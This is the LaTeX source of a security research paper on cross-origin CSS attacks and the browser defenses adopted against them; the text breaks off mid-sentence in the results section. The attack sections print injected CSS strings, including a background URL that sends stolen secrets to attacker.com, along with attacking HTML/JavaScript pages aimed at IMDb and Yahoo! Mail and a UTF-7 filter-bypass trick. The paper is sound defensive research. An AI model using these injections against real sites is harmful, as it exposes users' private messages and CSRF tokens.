\documentclass{acm_proc_article-sp}
\usepackage{url}
\usepackage{verbatim}
\usepackage[utf8]{inputenc}
\usepackage{microtype}
\usepackage{booktabs}
\usepackage{upquote}
\hyphenation{brow-ser brow-sers tra-dit-ion-al ja-va-script Web-Kit}
\begin{document}
% fix some inappropriately large gaps - some of this must be after
% begin document
\itemsep 0pt
\partopsep 0pt
\topsep 0pt
\makeatletter
\def\paragraph{%
    \@startsection{paragraph}{4}{\z@}{\z@ \@plus \p@}{-5\p@}{\subsecfnt}}
\makeatother
\renewenvironment{itemize}{%
 \begin{list}{$\bullet$}
  {\setlength{\itemsep}{0pt}
   \setlength{\parsep}{3pt}
   \setlength{\topsep}{3pt}
   \setlength{\partopsep}{0pt}
   \setlength{\leftmargin}{1.5em}
   \setlength{\labelwidth}{1em}
   \setlength{\labelsep}{0.5em}}}
  {\end{list}}

\title{Protecting Browsers from Cross-Origin CSS Attacks}
\numberofauthors{4}
\author{
\alignauthor
Lin-Shung Huang\\
      \affaddr{Carnegie Mellon University}\\
      \affaddr{linshung.huang@sv.cmu.edu}
\alignauthor
Zack Weinberg\\
      \affaddr{Mozilla}\\
      \affaddr{zweinberg@mozilla.com}
\and
\alignauthor
Chris Evans\\
      \affaddr{Google}\\
      \affaddr{cevans@google.com}
\alignauthor
Collin Jackson\\
      \affaddr{Carnegie Mellon University}\\
      \affaddr{collin.jackson@sv.cmu.edu}
}

\newcommand{\todo}[1]{\textbf{[TODO: #1]}}

\maketitle
\begin{abstract}
Cross-origin CSS attacks use style sheet import to steal confidential
information from a victim website, hijacking a user's existing
authenticated session and bypassing cross-site defenses.  We show how
to conduct these attacks with any browser, even if JavaScript is
disabled, and propose client-side defenses that still allow the vast
majority of web sites to function normally. We have implemented and
deployed defenses in Firefox, Google Chrome, and Safari. Our defense
proposal has also been adopted in Opera.
\end{abstract}

\category{K.6.5}{Management of Computing and Information Systems}
                {Security and Protection}

\terms{Security}

\keywords{CSS, MIME, Same-Origin Policy}

\section{Introduction}

The World Wide Web was originally envisioned \cite{wwwproposal} as a
means to collate a wide variety of human-readable, static documents,
present them via a unified interface, and facilitate browsing through
them by searching or via inter-document references. It has grown into
a versatile platform for all kinds of computing tasks, progressively
gaining support for data entry, client-side scripting, and
application-specific network dialogues.  Web-hosted applications have
supplanted traditional desktop applications for almost everything that
requires network communication, and are becoming competitive in other
areas.  It is not an exaggeration to say that the Web is the
development platform of choice for new software.

The \emph{same-origin policy}~\cite{mozillasameorigin} is the basic
principle used to secure Web applications from each other.  Scripts
belonging to one website can only communicate with that site's
servers, and cannot access the contents of pages loaded from other
sites.  However, this compartmentalization applies only to scripts.
An HTML document can load any sort of content---images, style sheets,
nested documents and “plug-ins,” even scripts---from any site,
same-origin or not.  In theory, this is a safe, useful capability:
rarely-changing content like images may be hosted on servers dedicated
to that purpose; popular script libraries (jQuery, Prototype, etc) may
be shared among sites; pages may incorporate YouTube-hosted videos
instead of just referring to them.  Browsers apply the same-origin
policy even within what appears to the user to be one unified “page;”
for instance, scripts can only inspect the DOM tree for an
\texttt{IFRAME}'s nested document if that document came from the same
origin.

Cascading style sheets (CSS) are the third principal component of Web
documents; they define appearance, just as HTML defines content and
JavaScript behavior.  Of the three, CSS was invented last; proposals
for author control of style were circulated as early as
1993~\cite{css-history}, but the first complete specification dates to
1996~\cite{css1} and was not implemented in a widely-used browser till
1997~\cite{eich}.  The CSS specification is continually being
extended, and its original designers planned for this.  As long as new
CSS features conform to the \emph{forward-compatible parsing rules}
defined in \cite{syndata}, old browsers will skip over features they
do not implement, while continuing to honor instructions that they do
understand.  Web designers can thus build sites that take advantage of
the very latest CSS features but “degrade gracefully” and remain
usable with older browsers.  Unfortunately, the forward-compatible
parsing rules are so permissive that they can find valid CSS
constructs in an input stream that was not intended to be CSS at all;
for instance, in an HTML document.

This leads to a security hole, first described (to our knowledge) in
2002 \cite{cssxss02} and rediscovered at least twice since then
\cite{cssxss05,cssxss08}.  If a malicious site can inject chosen
strings into a target webpage (whose structure, but not specific
contents, are known) and then load that page as a style sheet, it can
extract information by examining what the CSS parser makes of this
“sheet.”  even if the target page cannot be retrieved
without presenting login credentials, because the browser will present
any credentials (e.g.\ HTTP cookies) it has stored for the target
server when it does the load.  However, to date, all published attacks
of this type have required JavaScript, and most have been specific to
Internet Explorer.

In this paper, we present a general form of the attack that can be
made to work in any browser that supports CSS, even if JavaScript is
disabled or unsupported.  We then propose and implement modifications
to browser handling of CSS that completely block the attack, as long
as the victimized web site does not make certain errors (discussed
below).  Our modifications have no negative side effects for most
websites, and have been adopted by Firefox, Google Chrome, Safari, and
Opera.

\paragraph{Organization}
The rest of this paper is organized as follows. Section~\ref{sec:threatmodel} presents a threat model for cross-origin CSS attacks.
Section~\ref{sec:attacks} describes the attack in detail. Section~\ref{sec:defenses} proposes and evaluates defenses.
Section~\ref{sec:relatedwork} surveys related work.
Section~\ref{sec:conclusion} concludes.

\section{Threat Model} \label{sec:threatmodel}

The threat model for cross-origin data theft with CSS is essentially
the same as the threat model for other cross-origin attacks.  A
\emph{web attacker}~\cite{jackson09thesis} is a malicious principal
who owns a domain name and operates a web server.  The web attacker's
goal is to steal data from another web site (the \emph{target}) that
should only be revealed to a particular user (the \emph{victim}) and
not to the attacker.  Alternatively, the goal may be to forge requests
to the target site using the victim's credentials.  Cross-origin CSS
attacks directly facilitate the first goal, and may indirectly
facilitate the second goal by giving the attacker access to session
credentials.

The web attacker can send and receive arbitrary network traffic, but
only from its own servers.  It cannot modify, or even eavesdrop on,
traffic to other sites, nor can it generate “spoofed” network frames
that purport to be from some other site.  Also, it cannot install
malicious software on the victim's computer; if it could, all
browser-based defenses would be useless.

The web attacker can inject text strings into the target site,
provided that they pass state-of-the-art server-side XSS filters such
as \cite{htmlpurifier}.  In general, a cross-site CSS attack will
require the attacker to inject two strings, one on each side of the
secret to be stolen; however, depending on the structure of the target
page, one string may be sufficient.

Finally, the web attacker can entice the victim into visiting its
site; this is easily done either by social engineering, or by
manipulating an advertisement network.  We do not assume that the
victim discloses any sensitive information while on the attacker's
site; merely rendering the attacker's web content is sufficient.

\section{Cross-Origin CSS Attacks} \label{sec:attacks}

In this section, we present cross-origin CSS attacks in detail.
First, we describe aspects of browser behavior that, together,
make these attacks possible.  Second, we lay out the steps of an
attack on a hypothetical website.  Third, we discuss constraints on
practical executions of the attack.  Finally, we demonstrate that the
attack can be carried out against several popular web applications.

\subsection{Browser Behavior}

Cross-origin CSS attacks are possible because of existing browser
behaviors, reasonable taken in isolation, but with unexpected
interactions: session authentication, cross-origin resources,
error-tolerant style sheet parsing, and content sniffing.

\subsubsection{Session Authentication}
Web applications that handle sensitive data typically use client-side
state to manage a distinct “session” for each visitor.  The most
common technique uses HTTP cookies~\cite{rfc2109,httpstate} to define
a session; HTTP authentication~\cite{rfc2617} is also viable, but less
popular since it gives the application less control over user
experience.  Either way, once a user has logged into a web
application, their browser will transmit a credential with every HTTP
request to that server, allowing the server to identify the session
and reply with HTML documents containing confidential information
intended only for that user.  A request for the same URI without the
credential produces an HTTP error, or a generic document with no
confidential information.

\subsubsection{Cross-Origin Resources}
As discussed in the Introduction, browsers permit web pages to
reference resources (images, scripts, style sheets, etc.)\ from any
origin, not just from the server hosting the page itself.  Requests
for cross-origin resources transmit any credentials (cookies or HTTP
authentication tokens) associated with the site that hosts the
resource, \emph{not} credentials associated with the site whose page
made the reference.  Thus, confidential information from one site can
be “transcluded” into a page that could not read it directly.  The
browser prevents scripts in the requesting page from inspecting any of
the embedded content, so this should be safe.  However, cross-origin
request forgery (CSRF) attacks~\cite{csrf} exploit this in conjunction
with the common use of URIs to name \emph{commands} as well as
resources; given the right HTML, the browser will cheerfully try to
load an image from \url{http://example.com/logout} or
\url{http://example.com/post12345?action=delete}.

\begin{figure*}[t]
\begin{center}
\includegraphics[width=5in]{victim-manipulation}
\vskip 0.5em
\setlength{\tabcolsep}{0.12in}
\begin{tabular}{p{1.5in}p{1.5in}p{1.5in}}
\centering
HTML document; secret data is highlighted.&
\centering
Attacker injects CSS leader and trailer around secret.&
\centering
CSS parser skips most of the document, makes secret
available via computed style.
\end{tabular}
\end{center}
\caption{Anatomy of the attack.}
\label{figure:victim}
\end{figure*}

\subsubsection{Error-Tolerant Style Sheet Parsing} \label{sec:lax}
CSS syntax has much more in common with JavaScript than with HTML.
HTML uses angle brackets to delimit \emph{tags} that must nest; text
outside tags is mostly unparsed. CSS and JavaScript both use curly
braces to enclose \emph{blocks}; inside or outside a block, the input
text must follow a formal grammar.  However, CSS's \emph{keywords} are
almost entirely different from JavaScript's keywords.

When browsers encounter syntax errors in CSS, they discard the current
syntactic construct, skip ahead until what appears to be the beginning
of the next one, then start processing again.  The CSS
specification~\cite{syndata} defines precisely how this must be done,
so that browsers will behave predictably when they see new CSS
features they do not understand.  When skipping ahead, the browser
uses only a few simple grammar rules:

\begin{itemize}
\item Depending on where the syntax error occurred, the next syntactic
  construct might begin after the next semicolon, after going up one
  brace level, or after the next brace-enclosed block.
\item While skipping, parentheses, square brackets, and curly braces
  must still be properly balanced and nested.
\item Unlike in HTML, angle brackets are not expected to balance.
\item \verb|/* ... */| is a comment to be ignored, as in JavaScript.
  However, unlike JavaScript, \verb|//| does \emph{not} indicate the
  beginning of a single-line comment.
\item Single- and double-quoted strings also work as in JavaScript;
  backslash escapes are a little different, but this doesn't matter
  for our purposes.  Internet Explorer permits strings to extend past
  a line break, but in all other browsers this is a syntax error.
\item The end of a style sheet closes all open constructs
  \emph{without error}.
\end{itemize}

The left angle bracket, \texttt{<}, so common in HTML, has no meaning
in CSS; it will invariably cause a syntax error.  (The right angle
bracket, \texttt{>}, can appear within CSS selectors.)  Thus, a CSS
parser encountering an HTML document will go into skip-ahead mode on
the very first tag in the document, and will probably stay there until
the end of the file.

\subsubsection{Content Sniffing} \label{sec:mime}
The HTTP \texttt{Content-Type} header is supposed to indicate the type
of the content being transmitted, using the Multipurpose Internet Mail
Extensions (MIME) type vocabulary~\cite{mime}; for instance, HTML is
labeled \texttt{text/html}, CSS is labeled \texttt{text/css}, and a
JPEG-format photograph is labeled \texttt{image/jpeg}.  For content
that is, at root, textual, \texttt{Content-Type} is also supposed to
indicate the character encoding.

Unfortunately, the \texttt{Content-Type} header is unreliable in
practice; the situation is better than it was ten years ago, but
misconfigured HTTP servers still frequently omit this header, or
produce it but with incorrect information.  Therefore, browsers must
use “content-sniffing” algorithms~\cite{securecontentsniffing} that
inspect the first few bytes of the HTTP response body, as well as the
\texttt{Content-Type} header, to decide how to process resources.  The
security problems this causes have been well-covered elsewhere.

CSS is also frequently delivered with an incorrect MIME type, usually
\texttt{text/plain} or \texttt{text/html}.  A valid style sheet can
begin with an enormous number of different byte sequences, so browsers
do not attempt to content-sniff for CSS.  Instead, they allow a
document in “quirks mode”~\cite{quirksmode} to load \emph{anything at
  all} as a style sheet, regardless of its \texttt{Content-Type}
header.  (In “standards mode,” style sheets must be delivered with the
correct \texttt{Content-Type}, or they are ignored.)

\begin{table*}
\centering
\footnotesize
\begin{tabular}{crccccc}
\toprule
Approach&\multicolumn{1}{c}{API}&IE&FF&Opera&Safari&Chrome\\
\midrule
CSS Object Model&
  \texttt{styleSheets[].cssRules[].cssText}&&&&\checkmark&\checkmark\\
 &\texttt{getMatchedCSSRules().cssText}&&&&\checkmark&\checkmark\\
\addlinespace
Computed Style&
  \texttt{getComputedStyle}&&\checkmark&\checkmark&\checkmark&\checkmark\\
 &\texttt{currentStyle}&\checkmark&&\checkmark&&\\
\addlinespace
No Javascript&
  \texttt{background-image}, etc.&
  \checkmark&\checkmark&\checkmark&\checkmark&\checkmark\\
\bottomrule
\end{tabular}
\caption{Methods of Extracting Information from Cross-Origin Style Sheets}
\label{table:DOM}
\end{table*}

\subsection{Attack Steps}
In a cross-origin CSS attack, the attacker wishes to steal data that
should only be revealed to a particular user (the \emph{victim}) from
a web site it does not control (the \emph{target}).  The stolen data
may be itself of value (e.g.\ a private e-mail message), or it may
enable another attack (e.g.\ a token embedded in the target document
to block CSRF attacks).  To do so, the attacker first injects strings
into the target document that bracket the data to be stolen; then it
loads the target document as if it were a style sheet for a page under
its own control.  (Since the attacker controls this page, it can
ensure that “quirks mode” is in effect, so the \texttt{Content-Type}
of the target document does not matter.)  The injected strings cause
the CSS parser to ignore most of the document and extract the secret,
bypassing the same-origin policy.  Figure~\ref{figure:victim}
illustrates these steps.

\subsubsection{CSS String Injection}
One might expect that an HTML document, when parsed as a style sheet,
would produce nothing but syntax errors.  However, because of the
predictable error recovery rules described in section~\ref{sec:lax},
it is possible to inject strings into a document that will cause the
CSS parser to come out of error recovery mode at a predictable point,
consume some chunk of the document as a \emph{valid} rule, and then
return to skipping.  Attackers have many options for injecting text
into a web page, even one they cannot see without authentication.  In
\cite{cssxss08} the attacker created an account on the target site
with a carefully crafted user handle, then induced the victim to view
the account profile.  Our demonstration attacks in
section~\ref{sec:demos} use intra-site private messages or junk
email sent to the victim.

In the middle document in figure~\ref{figure:victim}, the attacker has
arranged to insert two strings into the document:
\begin{itemize}
\item \verb|{}#f{font-family:'| before the secret
\item \verb|';}| after the secret
\end{itemize}
The target site has wrapped each of these in an HTML \verb|<span>|,
which is harmless to the attacker's purpose.  The opening string has
three components: The attacker can safely assume that the CSS parser
is in error recovery mode, looking for a brace-enclosed block, when it
encounters the two-character synchronization sequence \verb|{}|.  This
sequence will take the CSS parser out of error recovery, unless there
is something before the injection point that must be balanced---an
unclosed string or CSS comment, or an unmatched \verb|{| \verb|[| or
\verb|(|.  If the attacker can predict what comes before the injection
point, it can tailor the synchronization sequence to match.  The next
component, \verb|#f{font-family:| is the beginning of a valid CSS
style rule, declaring the font family for an element in the attacker's
document (with ID \texttt{f}).  The \texttt{font-family} property
takes a string constant as its value; thus the final component of the
opening string is a single quote character, \verb|'|.  The CSS parser
will absorb whatever follows as a string, as long as it contains
neither line breaks nor another single quote.  (The text in
figure~\ref{figure:victim} has been word-wrapped for readability; if
any of the line breaks in between the injected blocks were actually
present, the attack would only work in IE.)

The closing string simply ends the CSS string constant with another
quote mark, and then closes the style rule with a semicolon and a
close brace.  (The semicolon could be omitted.)  Regardless of what
appears after the close brace, this style rule has been successfully
parsed and will affect the attacker's document.

\subsubsection{Cross-Origin CSS Import}
When the victim user visits \texttt{attacker.com}, the attacker's page
instructs the victim's browser to fetch and load the target document,
with its injected strings, as an external style sheet.  This can be
done with the \texttt{link} tag~\cite{html}:

\verb|<LINK REL="stylesheet" HREF="http://target.com">|

or with the CSS “import” directive, in an internal style sheet:

\verb|<STYLE>@import url(http://target.com);</STYLE>|

The attacker must ensure that their page is in “quirks mode,” but this
is easy to do: simply do not begin the page with any \verb|<!DOCTYPE|
declaration, and do not serve it as XHTML.

\subsubsection{Confidential Data Extraction}\label{sec:extraction}
Having loaded the target document as a style sheet, the attacker must
finally extract the secret from the style rules.  There are three
approaches, some of which are more convenient and some of which work
under more conditions; Table~\ref{table:DOM} summarizes them.
JavaScript-based approaches transmit the stolen data to the attacker's
server using \texttt{XMLHttpRequest} or a hidden form; the
non-JavaScript approach uses a carefully constructed URL instead.

\paragraph{CSS Object Model}
JavaScript can read the text of successfully parsed style rules via
the \texttt{cssText} property of \emph{style rule} objects.  All the
style rules for a document are visible in the
\texttt{document.styleSheets[].cssRules[]} arrays.  Safari and Google
Chrome also provide the \texttt{getMatchedCSSRules} utility function
that can retrieve style rules matched by an element.  This is perhaps
the most convenient way to extract secrets, but it only works in
Safari and Chrome.  IE, Firefox, and Opera have blocked JavaScript
access to style rules from sheets loaded cross-origin since 2002 (in
response to~\cite{cssxss02}).  In the example in
figure~\ref{figure:victim}, \texttt{cssRules[0].cssText} would expose
all of the text that isn't struck out in the right-hand document.

\paragraph{Computed Style}
JavaScript can also inspect the style currently applied to an element,
never mind how it got that way.  This variant of the attack is
slightly less convenient; the attacker must ensure that the style rule
produced by the attack does apply to some element in the attacking
page (not in the target page), and the JavaScript code required is not
fully portable.  Most browsers support the standard function
\texttt{getComputedStyle}, but for IE one must use the
\texttt{currentStyle} object.  However, no current browser blocks
access to computed styles based on origin, so this variant works in
any current browser as long as JavaScript is enabled.
\texttt{getComputedStyle(f).style.fontFamily} would expose the text
highlighted in white in the right-hand document in
figure~\ref{figure:victim}.

\paragraph{Without JavaScript}
This attack is even possible if users have disabled JavaScript,
although not as shown in Figure~\ref{figure:victim}.  Several CSS
properties can direct the browser to load an arbitrary URL; for
instance, the attacker might change their injected strings to

\begin{itemize}
\item \verb|{}#f{background:url('http://attacker.com/?|\\
  before the secret
\item \verb|');}| after the secret
\end{itemize}

As long as there is an element in the attacking page that matches this
rule, the browser will issue a GET request to the attacker's server
and provide the secret to be stolen as the query string.  This
approach is somewhat less convenient than the JavaScript-based ones
for bootstrapping a CSRF attack, since the secret has to be sent back
down from the server before it can be used, but a
clickjacking~\cite{clickjacking} CSRF attack would still be possible.
It is perhaps \emph{more} convenient if the only goal is to steal
data, since the attacking page can be simpler.

\subsection{Attack Limitations} \label{sec:limits}
At present, we are not aware of anyone deliberately designing their
HTML or their server-side filters to block cross-origin CSS attacks,
but they can still be thwarted by common characteristics of site
structure or by filters aiming to block JavaScript attacks.

\paragraph{Injection points}
The secret to be stolen is encapsulated within a CSS string constant,
within a property value, within a style rule.  To do this, the
attacker must inject \emph{two} strings into the document containing
the secret: one to begin the rule, and one to end it.  (By contrast,
JavaScript injection attacks usually require injecting only one
string.)  Sites that accumulate user-submitted text (blog comments,
for instance) are relatively more vulnerable to this attack; the
attacker can inject one string, wait a while, and then inject another.
Also, the string that must appear after the secret is very
simple---often just a close quote and a close bracket---and may
already be present in the target page; this was the case
in~\cite{cssxss08}.

\paragraph{Quotes}
CSS string constants can be written with single or double quotes.
Double quotes cannot occur inside a double-quoted string, and single
quotes cannot occur inside a single-quoted string, unless they are
escaped with backslashes.  Thus, if the secret to be stolen contains
single quotes, the attacker must use double quotes in their injected
strings, and vice versa.  If the secret contains both types of quotes,
or the attacker cannot predict which type of quotes it will contain,
the attack will fail.

If the “without Javascript” variant of the attack is in use, and the
attack only needs to work in Internet Explorer, the attacker may
instead use the unquoted form of \texttt{url()}.  This cannot contain
unescaped parentheses, but in IE it may contain unescaped quotes.

\paragraph{Newlines}
CSS string constants and unquoted \texttt{url()}s cannot contain
newlines, unless they are escaped with backslashes.  Therefore, any
newline within the secret will cause the attack to fail.  HTML pages
tend to contain many newlines; this, all by itself, protects many
potential target sites from CSS data theft attacks.  However,
rich-functionality sites often offer URL-based APIs that deliver
confidential information in a custom JSON or XML format, with no
newlines; these APIs may be vulnerable to CSS data theft even if the
human-visible site isn't.  Some sites even allow their users to
control the formatting of HTML server responses, e.g.\ to disable
pretty-printing; the attacker may be able to do the same.

Internet Explorer permits unescaped newlines in CSS string constants
and unquoted \texttt{url()}s.  This makes attacks far easier to
construct if the victim user is known to use IE.

\paragraph{Server-side filtering}
The present generation of server-side filters that aim to remove
malicious constructs from user-submitted content usually look for
dangerous HTML attributes and/or keywords peculiar to JavaScript.
These will not block cross-origin CSS attacks, because the injected
strings won't be nested within HTML elements, and CSS shares very few
keywords with JavaScript.

Some filters also replace particular punctuation characters with
equivalent HTML entities.  Single and double quotes are often
replaced, because of their significance in both HTML and JavaScript.
If \emph{any} of the punctuation in the injected strings is replaced
with an entity, the attack will fail.

The attacker may be able to defeat character replacement by
pre-encoding the replaced characters in UTF-7~\cite{utf7}.  For
instance, if the target site replaces single quotes with entities, but
leaves the other punctuation alone, the injected strings would become
\begin{itemize}
\item \verb|{}#f{font-family:+ACc-| before the secret
\item \verb|+ACI-;}| after the secret
\end{itemize}
The attacker would then request UTF-7 decoding from the CSS parser,
by specifying a character set in their \verb|link| tag:

\verb|<LINK REL="stylesheet" HREF="http://target.com"|\\
\verb| CHARSET="utf-7">|

This trick does not work if the target site specifies a character set
in its \texttt{Content-Type} header.  Unfortunately, only 584 out of
the top 1,000 web sites ranked by Alexa~\cite{alexa} specify character
sets for their home pages in their \texttt{Content-Type} headers.
Many of the others do provide character set information in a
\verb|meta| tag, but the CSS parser pays no attention to HTML
\verb|meta| tags, so that will not thwart an attacker's specification
of UTF-7 in a \verb|link| tag.  (Here we see another reason sites
should always provide correct \texttt{Content-Type} headers.)


\subsection{Example Attacks} \label{sec:demos}
We have successfully carried out cross-origin CSS attacks on several
popular websites.

\paragraph{IMDb}
IMDb is an online database of movies and related information, which
allows registered users to rate films, make posts on message boards,
and send private messages to each other.  An attacker with an account
on the site can steal the text of private messages to a victim user,
with these steps:

\begin{enumerate}
\item Send a private message to the victim's account, with the subject
  line: \verb|{}body{font-family:'|
\item Induce the victim to visit \texttt{attacker.com} while signed
  into IMDb; the attacking page is as follows:
\begin{verbatim}
<html>
<head>
<link rel="stylesheet"
     href="http://www.imdb.com/user/
           ur12345678/boards/pm/">
<script>
function steal() {
  alert(document.body.
    currentStyle["fontFamily"]);
}
</script>
</head>
<body onload="steal()">
</body>
</html>
\end{verbatim}
\end{enumerate}

The attacker must know the victim's account ID (\texttt{ur12345678} in
the example); this is public information that can be learned from the
victim's user profile page, even if one is not logged in.  The browser
will retrieve the victim's private messaging page, using the
appropriate credentials from the victim's IMDb session, and process it
as a style sheet.  The private message sent in step 1 will cause a
fragment of HTML, including the full text of earlier private messages
to the victim, to be absorbed as a CSS property value, which is then
revealed to JavaScript via \texttt{currentStyle}.

This attack works only in IE, due to newlines in the HTML for the
private messaging page.  This is why the JavaScript above uses only
the IE-specific mechanism for retrieving the computed style.  It is
not necessary to inject a second string after the text to be stolen,
because the end of the page serves that purpose (recall that end of
style sheet closes open CSS constructs without error).

\paragraph{Yahoo! Mail}
Yahoo! Mail is a popular web-based email service.  Its session cookies
persist for up to two weeks if users do not actively log out.  An
attacker can steal subject lines and CSRF tokens from a victim's email
inbox with these steps:

\begin{enumerate}
\item Send an email to the victim with the subject line:
  \verb|');}|
\item Wait for some time while the victim receives other messages.
\item Send another email to the victim with the subject line:
  \verb|{}body{background-image:url('|
\item Induce the victim to visit \texttt{attacker.com} while signed
  into Yahoo! Mail.  The attacking page is as follows:
\begin{verbatim}
<html>
<head>
<link rel="stylesheet"
     href="http://m.yahoo.com/mail">
<script>
function steal() {
  if(document.body.currentStyle) {
    alert(document.body.
      currentStyle["backgroundImage"]);
  } else {
    alert(getComputedStyle(document.body, "").
      backgroundImage);
  }
}
</script>
</head>
<body onload="steal()">
</body>
</html>
\end{verbatim}
\end{enumerate}

We use \texttt{background-image} instead of \texttt{font-family} in
this attack to illustrate the variety of CSS properties that can be
used.  The attacking page requests the mobile version of the site by
loading \url{http://m.yahoo.com/mail} rather than
\url{http://www.yahoo.com/mail}.  To reduce bandwidth requirements,
the mobile site has all unnecessary whitespace removed from its HTML,
including newlines; this allows the CSS portion of the attack to
succeed in more browsers, hence the JavaScript must detect which of
the two methods for retrieving computed style is supported.

The stolen HTML fragment contains the subject lines of every email
delivered to the victim in between the two attack messages.  It also
contains a hidden, unguessable token for each message; knowing these
tokens allows the attacker to delete messages via CSRF.

\paragraph{Hotmail}
Windows Live Hotmail is another web-based email service, operated by
Microsoft rather than Yahoo!.  It is vulnerable to nearly the same
attack as Yahoo! Mail: we can read messages and acquire CSRF tokens by
sending two emails to a victim Hotmail account with crafted subject
lines, then loading the mobile Hotmail website as a style sheet.
Unlike the mobile version of Yahoo! Mail, Hotmail delivers HTML
containing newlines, which limits the attack to Internet Explorer.

The existence of nearly identical attacks on unrelated websites
illustrates the general nature of cross-origin CSS vulnerabilities. We
expect that many social networking sites are vulnerable to variants of
this attack as well, because the attacker can leave arbitrary text
comments that are rendered somewhere on the victim's view of the page.

\section{Client-Side Defense} \label{sec:defenses}

In this section, we propose a client-side defense against cross-origin
CSS attacks, evaluate it for compatibility with existing web sites,
and review its adoption by major browsers.

\subsection{Proposal: Restrictions on Loading Cross-Origin CSS}
   \label{sec:proposal}

\begin{table*}
\centering
\def\m#1#2{\multicolumn{#1}{c}{#2}}
\begin{tabular}{crrrrrrr}
\toprule
  Requesting&      \m1{Page}&        &           &      \m2{Correct type}&    \m2{Incorrect type}\\
      server& \m1{rendering}&   Total& HTTP error& Well-formed& Malformed& Well-formed& Malformed\\
\midrule
            &          Total& 260,069&      2,363&     255,698&       999&         949&        60\\
\addlinespace
 Same-Origin& Standards Mode& 180,445&      1,497&     178,017&       506&         424&         1\\
            &    Quirks Mode&  25,606&        466&      24,445&       332&         304&        59\\
\addlinespace
Cross-Origin& Standards Mode&  47,943&        347&      47,345&       104&         147&         0\\
            &    Quirks Mode&   6,075&         53&       5,891&        57&          74&         0\\
\bottomrule
\end{tabular}
\caption{Categorization of CSS references for Alexa 100,000 sites.}
\label{table:results}
\end{table*}

\begin{table}[b]
\centering
\begin{tabular}{lrr}
\toprule
\multicolumn{1}{c}{Incorrect \texttt{Content-Type}}&
\multicolumn{2}{c}{Occurrences}\\
\midrule
               \texttt{text/html}& 715& (71\%)\\
              \texttt{text/plain}&  45&  (4\%)\\
\texttt{application/octet-stream}&  29&  (3\%)\\
                            other&  42&  (4\%)\\
                           absent& 178& (18\%)\\
\bottomrule
\end{tabular}
\caption{Incorrect content types observed for CSS.}
\label{table:MIME}
\end{table}

Cross-origin CSS attacks only work because the browser will attempt to
parse \emph{anything} that was requested by a stylesheet \verb|link|
or \verb|@import| as if it were CSS.  This is a backward compatibility
feature, part of the “quirks mode” applied to HTML documents that do
not include a proper document type definition (DTD).  In the
“standards mode” recommended for new content, style sheets will only
be processed if they are labeled with the HTTP header
\verb|Content-Type: text/css|.

The attacker, of course, controls whether or not the attacking page is
in quirks mode.  However, the attacker has no control over the
\verb|Content-Type| header labeling the \emph{target} page; that's
generated by the target site's server.  Therefore, our proposed
defense is to enforce \verb|Content-Type| checking for style sheets
loaded cross-origin, even if the requesting page is in quirks mode.

\subsubsection{Strict Enforcement}
The simplest and strictest version of this defense is to refuse to
load any style sheet cross-origin, unless it is labeled with
\verb|Content-Type: text/css|).  Unfortunately, this will also block
legitimate requests for cross-origin style sheets, when the server
providing the style sheet is misconfigured.  As we mentioned above,
\verb|Content-Type| misconfigurations are common, so the strict
defense may be too risky for browser vendors to adopt.

\subsubsection{Tolerant Enforcement}
To address this concern, we also propose a version of the defense that
tolerates common misconfigurations.  When the browser encounters a
cross-origin style sheet labeled with the wrong \verb|Content-Type|, it
begins parsing the sheet as CSS, but if a syntax error is encountered
before the first complete style rule is processed, it stops and
discards the sheet.

This rule still blocks most cross-origin CSS attacks, which attempt to
load an HTML document as CSS; it is almost certain that the first
thing in the file will be \verb|<html>| or \verb|<!DOCTYPE|, either of
which is a syntax error to CSS.  But sites using misconfigured servers
that label style sheets with the wrong \verb|Content-Type| will
continue to work as long as the first thing in the file is a
well-formed CSS rule.

\subsubsection{Experiment}
We surveyed the public Web to determine how often servers fail to
provide the correct MIME type for CSS files, how many of those
improperly-labeled style sheets are requested from a different origin,
and how many of those begin with a CSS syntax error.

\paragraph{Design}
Using an instrumented browser based on WebKit~\cite{webkit}, we
crawled the top 100,000 web sites ranked by Alexa~\cite{alexa} and
identified all of the style sheet resources used by their front pages.
Our instrumentation reported every style sheet requested while the
page itself was loading.  This allowed us to identify sheets used
indirectly via CSS \verb|@import| directives, and sheets added by
JavaScript during page load, as well as those mentioned directly in
the HTML.

% This table is here rather than with “Adoption” so it'll come out in
% the right place in the printed document.
\begin{table*}
\centering
\begin{tabular}{lccccccc}
\toprule
\multicolumn{1}{c}{\texttt{Content-Type}}
&Opera&Safari&Chrome&Firefox 3.5/3.6&Firefox 4&IE 7/8&IE 9\\
\midrule
\texttt{text/html},
other well-formed non-CSS                   & T & T & T & T & S & ? & ?\\
\texttt{*/*}, other ill-formed values       & T & T & T &   &   & ? & ?\\
Header absent                               & T &   &   &   &   & ? & ?\\
\texttt{application/x-unknown-content-type} & T &   &   &   &   & ? & ?\\
\bottomrule
\multicolumn{8}{r}{\vrule height10pt width0pt\relax\itshape
  S = strict defense; T = tolerant defense; blank = no defense.}
\end{tabular}
\caption{The effect of missing or ill-formed
  Content-Type}\label{table:adoption}
\end{table*}

\paragraph{Results}
From these 100,000 web sites, our crawler logged a total of 260,069
CSS references, of which 206,051 were same-origin and 54,018
cross-origin.  We did not include data for sites that were unreachable
during our evaluation, due to unresponding servers or domain name
errors. Our results are shown in Table~\ref{table:results}.

Of these 260,069 requested style sheets, 2,363 returned an HTTP error
(e.g.\ 400 Bad Request, 404 Not Found, or 500 Internal Server Error)
rather than a style sheet.  All current browsers discard a style sheet
when they receive an HTTP error, so we did not analyze the body or
\verb|Content-Type| header for these responses.

Of the remaining 257,706 sheets, only 1,009 were labeled with an
incorrect \verb|Content-Type| header (that is, anything but
\verb|Content-Type: text/css|.  We summarize the incorrect headers we
observed in Table~\ref{table:MIME}; \verb|text/html| is the most
common value, accounting for 71\% of errors.  Some of these
\verb|text/html| responses were HTML landing pages produced (with a
200~OK response code) because the desired style sheet no longer
existed; the \verb|Content-Type| is correct in this case, but the
server is still misconfigured, as it should have produced an HTTP
error.  Style sheets labeled with the generic types \verb|text/plain|
and \verb|application/octet-stream| make up a further 7\% of the
total, and a few other specific types appeared,
e.g.~\verb|application/x-javascript|.

The second most common error, accounting for 18\% of the total, is to
provide no \verb|Content-Type| header at all, or a header with no
value; these are listed together in table~\ref{table:MIME} as
“absent.”  An absent \verb|Content-Type| header is functionally
different from one with the wrong value; even in standards mode, a
style sheet with an absent \verb|Content-Type| will be processed as
CSS.  See section~\ref{sec:missing} for further discussion of absent
types.

The crawler logged whether standards or quirks mode was in effect for
each HTML page that loaded a CSS resource.  Quirks mode is in effect
for a substantial minority of the 100,000 sites crawled, but of the
260,069 requests for CSS, only 31,681 came from sites in quirks mode.
In standards mode, style sheets are always discarded if they are
